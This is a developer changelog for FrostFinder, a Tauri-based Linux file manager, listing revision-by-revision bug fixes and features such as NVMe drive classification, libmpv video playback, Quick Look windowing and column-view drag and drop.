- Also includes all fixes from r3–r8: NVMe drive classification, Wayland handle detection, JSON escaping fixes.

> **Requires Rust recompile** — `Cargo.toml` and `main.rs` modified.

---


| Field      | Value                        |
|------------|------------------------------|
| **Build**  | FrostFinder-beta-5-r4-2026-03-14 |
| **Status** | Beta |
| **Version**| 5 |
| **Revision**| 4 |
| **Date**   | 2026-03-14 |

---

## What's in Beta-1-r3

### Bug Fix: NVMe/SSD/HDD drives mis-classified as USB after manual mount

When mounting a secondary NVMe (or SSD/HDD) partition via `udisksctl` (one-click mount from the sidebar), the drive would appear as a USB device instead of NVMe/SSD/HDD.

**Root cause:** `classify_drive` checked the mountpoint path before the device name. `udisksctl` always mounts to `/run/media/<user>/<label>`, and the old code had an unconditional early-exit rule: *"anything under `/run/media` → type = usb"*. This fired before the device name check, so NVMe partitions mounted on demand were mis-labelled.

**Fix:** Reordered the classification chain in `classify_drive` — device name is now checked first. The `/run/media` → `"usb"` fallback only triggers for devices that aren't already identifiable as NVMe/SSD/HDD (e.g. truly unknown device names). Real USB drives still work correctly because `is_usb_device()` catches them in the device-name branch.

> **Requires Rust recompile** — `main.rs` modified (`classify_drive` type resolution order).

---

## What's in Beta-1-r2

### Feature: libmpv native video playback — replaces ffmpeg transcoding

4K H.265/HEVC (and all other video formats) now play via **libmpv** with full VA-API hardware acceleration, replacing the ffmpeg on-the-fly transcoding approach introduced in alpha-12-r32.

**Why the change:**
- The ffmpeg transcode path decoded H.265 in software (`libx264 -preset ultrafast`), putting significant CPU load on 4K files and making seeking slow/broken (ffmpeg had to re-encode from the seek point).
- libmpv uses VA-API hardware decoding — near-zero CPU, instant seeking, perfect quality, no codec blindspots.

**How it works:**
- The Tauri window already has `transparent: true`. libmpv's `wid` property embeds its GPU renderer directly into the FrostFinder X11 window.
- The preview slot and Quick Look video div are made CSS-transparent. mpv renders its video output to the exact pixel rect of those slots using `video-margin-ratio-*` fractional margin properties.
- A `ResizeObserver` on each slot recalculates the margins in real time as the panel is resized, keeping the video perfectly aligned.
- mpv is configured with `vo=gpu-next` + `hwdec=auto-safe` — uses VA-API on Intel/AMD, NVDEC on NVIDIA, software fallback if none is available.
- Hyprland users should add `render { direct_scanout = true }` in `hyprland.conf` for tear-free 4K via compositor bypass.

**Wayland note:** libmpv's `wid` embedding requires XWayland. On pure Wayland without `DISPLAY` set, a graceful fallback panel appears with an "Open with mpv" button. Most Hyprland setups have XWayland enabled by default.

**System dependency:** `mpv` (which ships `libmpv`) must be installed:
```
sudo pacman -S mpv        # CachyOS / Arch
sudo apt install mpv      # Debian/Ubuntu
sudo dnf install mpv      # Fedora
```

**Removed:** `ffmpeg`/`ffprobe` are no longer required. The `/transcode/` media server endpoint, `probe_video_codec` Tauri command, `getTranscodeUrl` JS helper, and `_UNSUPPORTED_CODECS` set have all been removed.

**New Tauri commands:** `get_window_xid`, `mpv_play`, `mpv_stop`, `mpv_update_margins`, `mpv_pause_toggle`

> **Requires Rust recompile** — `main.rs` and `Cargo.toml` modified (libmpv dependency + new commands).

---

## What's in Beta-1-r1

## Naming Scheme

```
FrostFinder - {status} - {version} - r{revision} - {YYYY-MM-DD}
```

| Segment    | Meaning |
|------------|---------|
| `status`   | `alpha` (unstable/dev), `beta` (feature-complete, testing), `rc` (release candidate), `stable` |
| `version`  | Major feature milestone number (increments when a significant new feature set lands) |
| `revision` | Bug-fix / patch counter within a version (resets to 1 on version bump) |
| `date`     | Build date in ISO 8601 format |

**Examples:**
- `FrostFinder-alpha-12-r1-2026-03-05` — first build of alpha v12
- `FrostFinder-alpha-12-r2-2026-03-06` — bug fix on same day
- `FrostFinder-alpha-13-r1-2026-03-10` — new feature milestone
- `FrostFinder-beta-1-r1-2026-04-01` — first beta build

---

## Build Instructions

```bash
# JS-only changes (fast, no recompile):
npm install
npm run dev         # dev server
npm run build       # production bundle

# Rust changes required (any main.rs edit):
npm run tauri dev   # dev with hot reload
npm run tauri build # production binary
```

> **This build requires a full Rust recompile** — `main.rs` was modified.

---

## What's in Beta-1-r1

### Status bump: Alpha → Beta
Core feature set is complete and stable:
- Icon, list, column, and gallery view modes
- Quick Look floating window with drag, resize, grid-aware arrow navigation
- Sidebar with NVMe/SSD/HDD/USB drive detection, one-click mount/eject
- Full-text search with rayon parallel backend, tag system, undo/redo
- Trash banner + empty-trash with confirmation
- Column view drag-and-drop, rubber-band selection, breadcrumb path editor
- 4K video playback via ffmpeg transcoding fallback (this release)

### Bug Fix
- **4K MKV files (HEVC/H.265) now actually play — root cause corrected**

  The r32 fix was logically correct but had a critical assumption that didn't hold: **WebKitGTK/GStreamer does not reliably fire `onerror` or the `error` event when a codec is unsupported.** Instead it silently stalls at `readyState=0` (HAVE_NOTHING) indefinitely with no DOM event. The entire r32 fallback chain was dead code for HEVC files.

  **New approach — codec probe before playback:**
  - `_mountVideoIntoSlot(slot, path, cssClass)` replaces the old `_makeVideoEl(url, ...)` call at all video render sites (preview panel + Quick Look).
  - It shows a "Checking codec…" spinner, then calls `probe_video_codec` (ffprobe, ~50ms for local files).
  - If the codec is in the `_UNSUPPORTED_CODECS` set (`hevc`, `av1`, `vc1`, `wmv3`, `flv1`, MS-MPEG4 variants), it goes **directly** to the `/transcode/` URL — the native URL is never attempted. No stalling, no waiting for an error that will never come.
  - If the codec is supported (h264, vp8, vp9, theora), native URL is used with the stall-detection and onerror backup still in place.
  - `_makeVideoEl` is now internal — callers always go through `_mountVideoIntoSlot`.
  - Added 4s stall-detection timer as additional safety net: if `readyState` is still 0 after 4s with no error, it treats that as a silent codec failure and kicks off transcoding.
  - `_UNSUPPORTED_CODECS` constant defined at module level for easy future updates.

  > **Requires Rust recompile** — `main.rs` was modified in r32 (transcode endpoint, `probe_video_codec`). This build carries those changes forward.

---

## What's in Alpha-12-r32

### Feature / Bug Fix
- **4K MKV (HEVC/H.265) files now play via automatic ffmpeg transcoding** — when WebKit can't decode a video (error code 4 = `MEDIA_ERR_SRC_NOT_SUPPORTED`), FrostFinder now silently retries using a new `/transcode/` streaming endpoint backed by `ffmpeg`. The file is re-encoded on-the-fly to H.264+AAC in fragmented MP4 format, which WebKit can always play. This covers the most common 4K case: H.265/HEVC in MKV (the default for YTS 4K releases and many Blu-ray remuxes).

  **How it works:**
  - New `/transcode/<path>` URL in the Rust media server spawns `ffmpeg -c:v libx264 -preset ultrafast -crf 23 -c:a aac -movflags frag_keyframe+empty_moov+faststart -f mp4 pipe:1` and streams stdout as chunked HTTP transfer.
  - `frag_keyframe+empty_moov` makes the MP4 streamable from byte 0 — the browser can start playing within seconds while ffmpeg continues transcoding the rest of the file.
  - JS `onerror` on every `<video>` element retries with `getTranscodeUrl(path)` on the first error code 4. If the transcode also fails (ffmpeg not installed, libx264 missing), it falls through to an error panel with install instructions.
  - A `Transcoding H.265 → H.264…` banner overlays the player while ffmpeg is working. It disappears the moment the browser fires `playing`.
  - New `probe_video_codec` Tauri command runs `ffprobe` to identify codec. Wired up but not yet surfaced in UI (planned: show codec badge in preview panel).
  - New `getTranscodeUrl(path)` JS helper mirrors `getMediaUrl` but prefixes `/transcode/`.

  **Requires ffmpeg to be installed** — it is not bundled. Install with:
  - Fedora: `sudo dnf install ffmpeg` (RPM Fusion)
  - Ubuntu/Debian: `sudo apt install ffmpeg`

  Without ffmpeg, the first error (native codec failure) triggers the transcode attempt, the transcode returns `503 X-FF-Error: ffmpeg-not-found`, `onerror` fires again, and the final error panel shows the ffmpeg install command.

  > **Requires Rust recompile** — `main.rs` modified (`handle_transcode_request`, `probe_video_codec`, updated `handle_media_request` routing).

---

## What's in Alpha-12-r31

### Bug Fix
- **4K MKV files won't play** — three root causes fixed:

  **1. No error feedback in Quick Look video** — `_qlBody` returned a raw `<video>` HTML string with no `onerror` handler, so when GStreamer failed to decode the file the user saw a permanently-stuck spinner with no explanation. Now `isVid:true` is returned alongside the HTML, and `renderContent` wires up `video.onerror` after innerHTML is set. On error it shows a clear panel with the codec error code and specific install commands for both Fedora/DNF (`gstreamer1-plugin-openh264`, `gstreamer1-vaapi`) and Debian/APT (`gstreamer1.0-libav`), plus an **"Open with external player"** button. The most common failure for 4K MKV is `MEDIA_ERR_SRC_NOT_SUPPORTED` (error code 4), caused by H.265/HEVC not being available through GStreamer.

  **2. `muted` attribute on Quick Look video** — the `<video>` element had `muted` set, so all sound was silenced. Removed. Quick Look now plays with audio.

  **3. Media server Nagle's algorithm stalling GStreamer range requests** — GStreamer's souphttpsrc makes many small HTTP range requests during MKV container parsing and seek probing (reading index clusters, codec private data, etc.). With Nagle enabled, the OS batches outgoing data and waits up to ~200ms before flushing each small response, serialising these requests. For a large 4K file where the index is at the end, this causes a visible stall before playback starts. Fixed by calling `s.set_nodelay(true)` on each accepted TCP connection in `start_media_server`. Media server read buffer also increased from 64 KB → 256 KB (`vec![0u8;262144]`) to reduce per-chunk syscall overhead when streaming large files.

  > **Requires Rust recompile** — `main.rs` modified (`set_nodelay`, buffer size).

---

## What's in Alpha-12-r30

### Feature / Bug Fix
- **Quick Look is now a true floating window, separate from the file browser** — replacing the previous side-panel approach. QL now opens as an independent floating window with macOS-style window chrome (close dot in the top-left, title centered, file size + counter on the right), a deep drop-shadow, rounded corners, and no backdrop overlay. It sits on top of FrostFinder without covering or dimming it, just like GNOME Sushi / Nautilus Quick Preview does.

- **Draggable** — the title bar is a full drag handle. Clicking and dragging moves the QL window freely. On first drag the window transitions from CSS-centered positioning to absolute `left`/`top` so it stays exactly where you place it.

- **FrostFinder icon highlight follows arrow key navigation while QL is open** — this was broken because `ql.focus()` was stealing keyboard focus from the main window, so arrow keys went to QL's own handler (which only updated the preview) instead of to main.js (which moves the selection highlight and then updates the preview). Fix: `ql.focus()` removed entirely and QL's own arrow-key `keydown` listener removed. All navigation is now handled exclusively by main.js. The only key QL listens for is `Escape` (via a capture-phase document listener that is removed when QL closes).

- **No flash on arrow navigation** — previously, every arrow key press called `openQuickLook` which did `ql.remove()` then recreated the whole div, causing the window to flash and reset its position. Now a module-level `_qlUpdate` hook is exposed. When `openQuickLook` is called while QL is already open, it routes through `_qlUpdate` which patches only the title bar text and body content in-place, leaving the window's position, size, and scroll state unchanged.

  Implementation summary (`src/views.js`):
  - `_qlBody()` helper unchanged.
  - Module-level `let _qlUpdate = null` — set on open, cleared on close.
  - `openQuickLook` checks `document.getElementById('quicklook') && _qlUpdate` at the top; if true, calls `_qlUpdate(...)` and returns immediately without touching the DOM structure.
  - `renderContent()` closure handles all innerHTML updates and re-wires buttons after each refresh.
  - `_attachDrag()` wires the titlebar drag after each `renderContent()` (idempotent via `_dragWired` flag).
  - Escape key handled via `document.addEventListener('keydown', handler, true)` (capture phase) — no focus required.
  - `ql.tabIndex` not set, `ql.focus()` not called.
  - `quickLookNavigate` retained as a no-op stub for backward compatibility.

---

## What's in Alpha-12-r29

### Feature
- **Quick Look opens as a side panel beside FrostFinder** — Quick Look no longer appears as a centered modal overlay that covers the file browser. It now slides in from the left as a fixed side panel (`--ql-panel-w: 440px`) while the main FrostFinder window shifts right to sit beside it. Both panels are fully visible and usable simultaneously. Pressing Space, Escape, or the ✕ button collapses the panel and slides the app back to full width.

  Implementation details:
  - `#quicklook` changed from `position:fixed;inset:0` (full-screen overlay) to a left-edge panel (`position:fixed;left:0;top:0;bottom:0;width:var(--ql-panel-w)`).
  - `.ql-backdrop` hidden — no dim/blur overlay needed.
  - `.ql-window` restyled to fill the panel (transparent background, no rounded corners or drop-shadow).
  - New `body.ql-side .window { left:var(--ql-panel-w) }` rule shrinks the app window to the right portion of the screen when the panel is open.
  - `.window` gains `transition:left .2s ease` so the shift in/out animates smoothly.
  - `openQuickLook` adds `document.body.classList.add('ql-side')` on open; all close paths (✕ button, Escape, Space toggle, backdrop click) call `document.body.classList.remove('ql-side')` before removing the element.
  - `--ql-panel-w` CSS variable in `:root` for easy width adjustment.

---

## What's in Alpha-12-r28

### Bug Fix / Feature
- **Quick Look arrow navigation follows icon grid layout** — previously, pressing ↑/↓ while Quick Look was open in icon view moved to the previous/next file in a flat list (same as ←/→), ignoring the visual grid. Now all four arrow keys navigate spatially within the grid:
  - `↑` — show the file one row above (jumps back `cols` positions in the entry list)
  - `↓` — show the file one row below (jumps forward `cols` positions)
  - `←` — show the file one cell to the left
  - `→` — show the file one cell to the right

  If the target cell is a folder it is skipped and the nearest file in the travel direction is used instead. In list, column, and gallery views the behaviour is unchanged: ←/↑ = previous file, →/↓ = next file.

  Implementation: `openQuickLook` now accepts an `iconCols` parameter and keeps a `curAllIdx` cursor (position in the full entry list, dirs + files) alongside the existing `curIdx` (position in the files-only list used for the ‹ › buttons and the N/M counter). The call sites in `main.js` now pass `entries` (all entries) + `curIdx` (index in all entries) + `state._iconCols` so the grid dimensions are available inside the overlay.

---

## What's in Alpha-12-r27

### Feature
- **Empty Trash banner** — when navigating to the Trash folder (`~/.local/share/Trash`), a slim banner appears between the breadcrumb toolbar and the file list. It shows a reminder that items in Trash will be permanently deleted when emptied, and an **Empty Trash** button on the right. Clicking it shows a confirmation dialog then calls `empty_trash` and refreshes the view. The banner hides automatically when navigating away from Trash. Implemented as a persistent `#trash-banner` div in the HTML that `renderTrashBanner()` shows/hides and repopulates on every render cycle.

---

## What's in Alpha-12-r26

### Bug Fix
- **Column view collapses to one column after any file operation** — the same root cause as r24 (drag-and-drop), but affecting all other file operations: delete, rename, create folder/file, compress, extract, undo, redo, clipboard paste, and empty trash. All of them called `refreshCurrent()` after completing, which calls `navigate(state.currentPath, 0, false)` — that wipes `state.columns` with `splice(0)` and rebuilds a single column.

  Fixed by replacing every post-operation `refreshCurrent()` call with `refreshColumns()`, which reloads each open column's directory listing in-place via `Promise.all` and re-renders without touching the column structure. In non-column views `refreshColumns()` still falls back to `refreshCurrent()` so behaviour is unchanged elsewhere.

  The four `refreshCurrent()` calls intentionally left unchanged: the function definition itself, the fallback inside `refreshColumns`, the filesystem watcher (which fires outside any user action context), and the F5 / Cmd+R explicit full-refresh shortcut.

---

## What's in Alpha-12-r25

### Breadcrumb improvements
- **Separator changed from `›` to `/`** — matches the design shown in screenshots; plain forward-slash between path segments, consistent with how file paths look everywhere.
- **Active (last) segment now bold white** — the current directory name is rendered in full white at `font-weight:600`; ancestor segments remain muted gray, making it immediately clear where you are.
- **Whole rail is click-to-edit** — previously only the invisible deadspace region to the right of the last pill would trigger path-edit mode. Now clicking anywhere on the breadcrumb rail that isn't a pill or ellipsis (including gaps between pills and the empty right area) enters edit mode, which is more discoverable.
- **Clear button in path-input mode** — the `✕` button on the right of the input clears the field without dismissing edit mode, so you can type a new path from scratch without having to select-all first. Uses `mousedown` + `preventDefault` so it doesn't blur the input.
- **Input field redesign** — the path input now fills the entire rail as a single wrapped container (`bc-input-wrap`) with a darker background and blue border, matching the look in the screenshot.

---

## What's in Alpha-12-r24

### Bug Fix
- **Column view collapses to one column after drag and drop** — `setupDropTarget` called `refreshCurrent()` on every successful drop. `refreshCurrent()` calls `navigate(state.currentPath, 0, false)`, and inside `navigate` the column view branch does `state.columns.splice(0)` — wiping the entire column stack — then pushes back a single new column for `state.currentPath`. All other open columns were gone.

  Fixed with a new `refreshColumns()` function that reloads every open column's directory listing in-place using `Promise.all`, preserving the full column stack, selections, and scroll positions. The drop handler now calls `refreshColumns()` instead of `refreshCurrent()`. In non-column views `refreshColumns()` falls back to `refreshCurrent()` as before.

---

## What's in Alpha-12-r23

### Bug Fixes — Column View

- **Arrow key directions corrected (again)** — Left and Right were still swapped from what was intended:
  - `→` Right — navigates INTO the highlighted folder, opening it as a new column.
  - `←` Left — goes back to the parent column, restoring its selection.

- **Drag and drop glitching** — `dragover` was not calling `e.stopPropagation()`. Both the directory frow and its parent `colList` are registered as separate drop targets. When dragging over a directory row, `dragover` fired on the frow (adding `drop-over`), then bubbled up to the `colList` (adding `drop-over` there too) — two overlapping blue outlines simultaneously. As the cursor moved between items, `dragleave` fired on each level at different times causing the highlights to flash and flicker. The `drop` handler already had `stopPropagation` (added in r20); `dragover` now has it too, so only the most specific drop target under the cursor highlights at any time.

---

## What's in Alpha-12-r22

### Bug Fix
- **Click to deselect had no visual effect in icon view** — `paint()` has an early-return guard at the top:
  ```js
  if (startRow === _rendered.start && endRow === _rendered.end) return;
  ```
  When the user clicks on empty space, the scroll position hasn't changed, so `startRow`/`endRow` are identical to the previous paint — `paint()` returns immediately and does nothing. `sel.clear()` had already run and correctly cleared the selection in state, but the DOM was never updated so items kept their `.sel` highlight.

  The correct function to call here is `d().render()`, which goes through `renderIconView`'s incremental path — that path walks every currently-rendered `.icon-item` element and calls `item.classList.toggle('sel', sel.hasp(e.path))`, which is exactly what's needed to visually deselect items without a full DOM rebuild.

  The same `paint()` bug affected the icon view contextmenu handler: right-clicking an unselected item called `sel.set(idx)` then `paint()` — the item state was updated but the `.sel` class was never added visually. Fixed the same way.

  List view, column view, and gallery view were unaffected — their deselect handlers call `render()` which always does a full rebuild.

---

## What's in Alpha-12-r21

### Bug Fix
- **Drag and drop into subfolders blocked (column view)** — the drop guard introduced in r20 was:
  ```js
  if(destPath === srcPath || destPath.startsWith(srcPath + '/')) return;
  ```
  `srcPath` is the **parent directory** of the dragged file, not the file itself. So dragging `Documents/file.txt` (srcPath = `/home/user/Documents`) onto `Documents/Projects/` (destPath = `/home/user/Documents/Projects`) hit the `startsWith` check and was silently blocked — making every drop onto any subfolder within the same column impossible.

  Fixed: the same-dir check (`destPath === srcPath`) is kept, but the descendant check now correctly tests each *dragged entry* individually: only blocks if a dragged item is itself a directory and `destPath` is that directory or inside it.

---

## What's in Alpha-12-r20

### Bug Fixes — Column View: Drag & Drop + Arrow Keys

**Drag and drop**

- **Root cause: wrong `srcPath`** — `dragState.srcPath` was set to `state.currentPath`, which in column view is always the *deepest open column*, not the column the file is actually being dragged from. The drop guard `if(destPath===dragState.srcPath)return` then blocked every valid cross-column drop. Fixed: `srcPath` is now computed from the dragged entry's own parent directory (`entry.path.slice(0, lastIndexOf('/'))`) — correct for all views.
- **`dragleave` firing on child elements** — every time the cursor moved from a `.frow` into one of its child spans (`.fico`, `.fname`, `.fchev`), `dragleave` fired and `drop-over` was removed. This made it visually impossible to hold the cursor steady over a drop target, and on some WebKitGTK versions prevented the `drop` event from registering. Fixed: `dragleave` now checks `relatedTarget` — only removes `drop-over` when the cursor actually exits the element, not when it moves between children.
- **Drop event propagation** — added `e.stopPropagation()` to the `drop` handler so drops on a directory frow don't also bubble to the parent `col-list` drop target.
- **Folder-into-itself guard** — added a check `destPath.startsWith(srcPath+'/')` to prevent moving a folder into one of its own descendants.
- **Directory frows as drop targets** — directory rows in column view now register as drop targets, so you can drag files directly onto a folder in any column.

**Arrow keys**

- **Left/Right were inverted** — corrected:
  - `←` Left — navigates INTO the highlighted folder, opening it as a new column to the right.
  - `→` Right — goes back to the parent column, restoring its previous selection highlight.
- **`state.currentPath` not updated on go-back** — after pressing Right to pop the last column, `state.currentPath` wasn't updated to the parent's path. `getVisibleEntries()` then searched for a column matching the stale path and returned `[]`, breaking Up/Down after any go-back. Fixed.
- **`sel._e` not restored on go-back** — `sel.set()` uses `sel._e[i].path`, but `sel._e` still pointed at the now-removed column's entries. Fixed: `sel._e` is now reassigned to the parent column's sorted/filtered entries before calling `sel.set()`.
- **Up/Down scroll** — selected row now scrolls into view with `behavior:'smooth'` after Up/Down navigation.

---

## What's in Alpha-12-r19

### Quality of Life
- **Click empty space to deselect** — clicking anywhere outside file items now clears the selection in all four views. Previously only right-click on empty space (context menu trigger) would clear selection; a plain left-click did nothing.

  - **Icon view** — `mousedown` on the wrap background (not targeting `.icon-item`) immediately clears selection and calls `paint()`. The rubber-band drag callback was also fixed: dragging over empty space and releasing (zero items hit, non-additive) now explicitly deselects rather than silently returning. This means drag-to-select → miss → release = deselected, which matches expected behaviour.
  - **List view** — `mousedown` on `.list-wrap` background (not targeting `.list-row`) clears selection.
  - **Column view** — `mousedown` on the columns container background (not targeting `.frow`) clears selection.
  - **Gallery view** — clicking between thumbnails in the strip (the delegated `click` on `#gallery-strip` where no `.gthumb` is found) clears selection and resets `gallerySelIdx`.

  All handlers respect modifier keys: `Ctrl`, `Meta`, and `Shift` clicks on empty space are ignored so that modifier+drag workflows are not broken.

---

## What's in Alpha-12-r18

### Bug Fix
- **MKV (and other video) files play audio/controls but show a black frame** — the `WEBKIT_DISABLE_DMABUF_RENDERER` environment variable was explicitly set to `0` (enabled). When DMA-BUF rendering is active alongside VA-API hardware decoding, WebKit tries to composite decoded video frames directly from GPU memory via the DMA-BUF path. Many GPU/driver combinations (AMD, Intel, NVIDIA with nouveau) cannot complete this path — the GStreamer pipeline initialises, audio decodes and plays, seek/pause work, but every video frame is composited as black. Three env var changes fix this:

  - `WEBKIT_DISABLE_DMABUF_RENDERER=1` — disables the DMA-BUF compositor path, forces WebKit to use a GL texture-upload path instead. This works universally across GPU drivers.
  - `GST_GL_PLATFORM=egl` — tells GStreamer to use EGL as its GL platform so it shares the same GL context as WebKit. Required for the GL texture-upload path to work correctly on Wayland.
  - `WEBKIT_USE_GSTREAMER_GL=0` — disables the GStreamer-GL integration. When combined with DMA-BUF disabled, leaving this on causes a conflict where GStreamer outputs frames via a GL path that WebKit's non-DMA-BUF compositor doesn't know how to receive, resulting in the same black-frame symptom.

  VA-API hardware decoding (`GST_VAAPI_ALL_DRIVERS=1`) is kept enabled — GStreamer will still decode using hardware acceleration, it just won't attempt to hand frames off via DMA-BUF.

> **Requires Rust recompile** — `src-tauri/src/main.rs` modified (startup env vars only).

---

## What's in Alpha-12-r17

### Bug Fixes
- **Some MKV files would not play** — three bugs in the HTTP media server (`src-tauri/src/main.rs`):

  1. **`Content-Range` was included on every HTTP response, including `200 OK`** (the root cause). RFC 7233 §4.1 says `Content-Range` must only appear on `206 Partial Content` responses. WebKit's GStreamer `souphttpsrc` element detects the contradiction (200 status but Content-Range present) and fails to initialise the GStreamer pipeline. Files that only need a single sequential read (small/simple MKVs) played fine; files where GStreamer issues a seek probe during demux init (larger MKVs, H.265, multi-track containers) failed silently. Fixed: `200 OK` responses now omit `Content-Range`; `206 Partial Content` responses include it as required.

  2. **`start` was not validated against `file_size`** — if a client sent `Range: bytes=N-` with `N ≥ file_size`, `end` was clamped to `file_size-1` but `start` remained larger, causing `end - start + 1` to underflow as `u64` (wraps to a huge value). The server would then try to read billions of bytes, immediately get EOF, and send a truncated response. Fixed: returns `416 Range Not Satisfiable` with `Content-Range: bytes */{file_size}` when `start ≥ file_size`.

  3. **No `Connection: close` header** — the server handles exactly one request per thread then closes the socket. Without `Connection: close` the browser assumes HTTP/1.1 keep-alive and tries to reuse the connection for subsequent range requests (e.g. seeking). Fixed: all responses now include `Connection: close`.

- **Video playback failures were silent** — both the gallery view and the preview panel had no `onerror` handler on `<video>` elements. When playback failed the loading spinner showed indefinitely. Fixed: a helper `_makeVideoEl()` builds the video element with an `onerror` callback that replaces the spinner with an error panel showing the reason (codec error vs network error) and an "Open with external player" button that calls `open_file` for system-default launch.

> **Requires Rust recompile** — `src-tauri/src/main.rs` modified (HTTP media server).

---

## What's in Alpha-12-r16

### Features
- **Nautilus-style breadcrumb rail** — The plain text breadcrumb and drag-resize handle have been replaced with an interactive pill rail:
  - **Pill buttons** — each path segment is a rounded pill button with a hover highlight. Root shows a home icon. The active (current) folder pill is visually distinct with a brighter background and border.
  - **Chevron separators** — `›` glyphs between pills, non-interactive.
  - **Overflow elision** — paths deeper than 5 segments collapse the middle into a `…` pill. Clicking `…` opens a small popover listing the hidden intermediate folders; clicking any navigates directly to it.
  - **Deadspace hit target** — the empty area to the right of the last pill is a `cursor:text` hit target. Clicking it activates inline path-edit mode.
  - **Inline path input (Ctrl+L or click deadspace)** — breadcrumbs are replaced by a focused text input pre-filled with the current absolute path. Press Enter to navigate (absolute path) or trigger a search (no leading `/`). Press Esc or click away to dismiss without navigating. Zero toolbar rebuild — only the rail `innerHTML` is swapped, search focus is never disturbed.
  - **Search mode label** — when in search mode the rail shows "Results for X — N items" with the live searching… badge, same as before but now with deadspace so Ctrl+L still works.
  - **Keyboard**: `Ctrl+L` enters edit mode, `Esc` exits it (before clearing search), `Enter` navigates or searches.

---

## What's in Alpha-12-r15

### Bug Fixes
- **Gallery view glitch when navigating between files** — Every thumbnail click and arrow key triggered a full `host.innerHTML` wipe-and-rebuild of the entire gallery DOM (main area + toolbar bar + entire strip). This caused: a visible blank flash while the new image loaded from the HTTP media server; the strip scroll position jumping to 0; all already-loaded thumbnail `<img>` elements being discarded and re-fetched from scratch; the `IntersectionObserver` being torn down and recreated on every navigation.

  **Fix — incremental update path:** `renderGalleryView` now stores `host._galleryMeta = {path, count}` after each full build. On subsequent calls within the same directory, it takes a fast incremental path instead:
  - Replaces only `#gallery-main` innerHTML (new file's content slot)
  - Replaces only `.gallery-bar` innerHTML (zoom/open controls)
  - Toggles `.sel` class on existing gthumb elements in-place — the strip DOM, thumb `<img>` tags, and scroll position are completely untouched
  - Loads media content into the already-inserted slot, binds zoom controls, applies zoom
  - Full rebuild only happens when navigating to a new directory or on first render

  Strip thumbnail click/dblclick handlers converted to **event delegation** on `#gallery-strip` (one listener, attached once per full build) instead of per-element listeners re-attached on every render.

  `_doRender()` invalidates `host._galleryMeta` on directory change (alongside existing `_ivMeta` invalidation for icon view) so a directory navigation always triggers a clean full rebuild.

---

## What's in Alpha-12-r14

### Features
- **Scroll-to-selected on view switch** — Switching view modes (icon / list / column / gallery) now always scrolls the previously selected item into the center of the viewport. Previously the scroll only fired when multi-select paths were saved; now it fires unconditionally for any `selIdx ≥ 0`. Uses two nested `requestAnimationFrame` calls so the DOM finishes painting (including virtual-scroll layout) before computing scroll position. All views use `block:'center'` so the item lands in the middle of the viewport, not at the edge.

- **Gallery view syncs selection on switch** — When switching to gallery view, `gallerySelIdx` is now explicitly set to `savedSelIdx` so the strip and main preview both show the item that was selected in the previous view.

- **Right-click → "Open With…"** — Right-clicking any file now shows an "Open With…" option (hidden for directories and multi-select). Clicking it opens a modal dialog that:
  - Reads all installed `.desktop` application entries from `/usr/share/applications`, `/usr/local/share/applications`, `/var/lib/flatpak/exports/share/applications`, and `~/.local/share/applications` (including Flatpak user installs).
  - Filters out `NoDisplay=true` and `Hidden=true` entries; strips `%f/%F/%u/%U` exec placeholders.
  - Deduplicates by app name, sorts alphabetically.
  - Shows a live search field to filter by app name.
  - Clicking an app launches it with the file path as the argument via a new `open_with_app` Tauri command.

> **Requires Rust recompile** — `main.rs` modified (new `list_apps_for_file`, `open_with_app` commands).

---

## What's in Alpha-12-r13

### Bug Fixes
- **Gallery strip: labels still invisible/cropped (r12 partial fix)** — r12 fixed the class name (`gthumb-name` → `gthumb-lbl`) but the label remained hard to read due to `contain: layout style paint` on `.gthumb` restricting painting, and `align-items:center` on `.gallery-strip` sometimes clipping tall items. Full fix: removed `contain` from `.gthumb` (kept it on all other interactive items), changed strip to `align-items:flex-end` so thumbs sit flush at the bottom, rewrote `.gthumb-lbl` to use `flex:1; display:flex; align-items:center` — a dark `rgba(0,0,0,.45)` backing fills the label zone guaranteeing white text is always readable regardless of thumbnail content. Strip height 128px → 136px, gthumb height 106px → 118px, icon area 60px → 64px.
- **Window title still showed α12-r1** — `tauri.conf.json` title string was never updated after r1. Updated to `FrostFinder α12-r13` so the running revision is always visible in the title bar.

### Visual Changes
- **Sidebar +/− buttons** — Buttons confirmed in FAVORITES header right edge (moved in r12). Restyled to blue tint (`rgba(96,165,250)`) making them visually distinct from the section label and easier to spot.

> **Requires Rust recompile** — `tauri.conf.json` changed (window title).

---

## What's in Alpha-12-r12

### Bug Fixes
- **Gallery strip labels invisible/cropped** — The thumbnail label `<span>` in `renderGalleryView` was using class `gthumb-name` which had no CSS definition (the stylesheet targets `.gthumb-lbl`). Fixed by correcting the class name to `gthumb-lbl` in `views.js`. Additionally improved label styling: font size raised from 8.5px → 10.5px, weight set to 500, color hardened to `#e8e8ea` (vs inheriting a dim tertiary variable), `white-space:nowrap` replaced with `display:-webkit-box; -webkit-line-clamp:2; word-break:break-word` so long names wrap to two lines instead of being silently truncated. Thumbnail height increased 88px → 106px and strip height 110px → 128px to accommodate the extra line.

### Features
- **Sidebar +/− size buttons moved to Favorites header** — The sticky `sb-size-footer` at the bottom of the sidebar has been removed. The `−` and `+` buttons now live inline at the right edge of the **FAVORITES** section header, keeping them always visible without consuming persistent footer space. The `sb-title` row is now `display:flex; justify-content:space-between` so the buttons float right without affecting the uppercase label.

---

## What's in Alpha-12-r11

### Bug Fixes
- **Unused variable warning in `lsblk_unmounted_all`** — The `mounted_mnts` parameter (a `HashSet<String>` of already-shown mountpoints) was declared in the function signature but never read inside the body — the function already filters by device path via `mounted_devs` and by lsblk-reported mountpoints directly. Renamed to `_mounted_mnts` to suppress the `#[warn(unused_variables)]` compiler warning while preserving the parameter for API compatibility.

> **Requires Rust recompile** — `main.rs` modified (`_mounted_mnts` rename in `lsblk_unmounted_all`).

---

## What's in Alpha-12-r10

### Bug Fixes
- **Right-click scroll jump in list view** — `contextmenu` on a list row called `render()` which rebuilt `host.innerHTML`, destroying `.list-wrap` and resetting its `scrollTop`. Fixed by snapshotting `listWrap.scrollTop` before `render()` and restoring it in the next `requestAnimationFrame`. Same fix applied to the flat list (search results) view.
- **Right-click scroll jump in column view** — Same root cause. Fixed by snapshotting all `.col-list` scroll positions before `render()` and restoring them in an RAF, matching what the left-click handler already does.
- **Root Disk, cache, tmp hidden from sidebar** — `classify_drive` now explicitly hides `/` (Root Disk) plus any mountpoint whose last path segment is `cache`, `tmp`, `log`, `lost+found`, `proc`, or `sys`. The exact-hide list was also extended to cover `/root` and `/srv`.

### Features
